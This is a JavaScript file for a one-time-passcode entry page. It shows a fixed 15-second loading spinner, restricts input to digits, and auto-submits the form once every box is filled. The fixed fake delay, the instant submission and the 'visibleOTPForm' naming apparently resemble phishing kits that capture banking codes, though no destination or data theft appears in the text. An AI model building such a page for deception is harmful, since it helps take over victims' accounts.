document.addEventListener("DOMContentLoaded", function() {
    const spinnerContainer = document.querySelector('.spinner-container');
    const otpContainer = document.querySelector('.otp-container');
    const thanksContainer = document.querySelector('.thanks-container');
    const otpInputs = document.querySelectorAll('.otp-inputs input');
    const otpForm = document.getElementById('visibleOTPForm');
    const btnConfirm = document.querySelector('.btn-2');

    thanksContainer.style.display = 'none'; // Ensures that the Thanks container is initially hidden

    // Show spinner for 15 seconds on page load
    setTimeout(() => {
        spinnerContainer.style.display = 'none';
        otpContainer.style.display = 'flex';
    }, 15000);

    otpInputs.forEach((input, index) => {
        input.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, ''); // Allow only numbers
            
            if (input.value.length === 1 && index < otpInputs.length - 1) {
                otpInputs[index + 1].focus(); // Auto-navigate to the next input
            }
            
            if (Array.from(otpInputs).every(i => i.value.length === 1)) {
                btnConfirm.removeAttribute('disabled');
                otpForm.submit(); // Auto submit the form when all OTPs are filled
            } else {
                btnConfirm.setAttribute('disabled', 'true');
            }
        });
    });

    otpForm.addEventListener('submit', function(event) {
        event.preventDefault();

        if (Array.from(otpInputs).every(i => i.value.length === 1)) {
            otpContainer.style.display = 'none';
            spinnerContainer.style.display = 'flex';

            setTimeout(() => {
                spinnerContainer.style.opacity = 0;
                setTimeout(() => {
                    spinnerContainer.style.display = 'none';
                    thanksContainer.style.display = 'flex';
                    thanksContainer.style.opacity = 1;
                }, 500);
            }, 3000);
        } else {
            alert('Please fill out all the OTP fields!');
        }
    });
});
